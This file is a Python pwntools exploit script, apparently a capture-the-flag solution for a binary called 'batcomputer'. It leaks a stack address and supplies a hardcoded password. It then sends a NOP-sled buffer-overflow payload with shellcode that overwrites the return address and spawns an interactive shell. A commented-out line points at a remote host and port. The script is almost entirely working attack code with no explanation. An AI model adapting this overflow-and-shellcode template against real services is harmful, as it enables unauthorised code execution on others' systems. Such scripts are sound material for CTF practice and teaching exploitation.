from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'


#r = remote("159.65.52.8", 31023)
r = process("./batcomputer")
r.sendlineafter('>', '1')
line = r.recvlineS()
first, *middle, last = line.split()
address = p64(int(last, 16))
shellcode = asm(shellcraft.popad())
shellcode += asm(shellcraft.linux.sh())
payload = asm('nop') * (84 - len(shellcode)) + shellcode + address
r.sendlineafter('>', '2')
r.sendlineafter('password:', "b4tp@$$w0rd!")
r.sendlineafter('commands:', payload)
r.sendlineafter('>', '3')
r.interactive()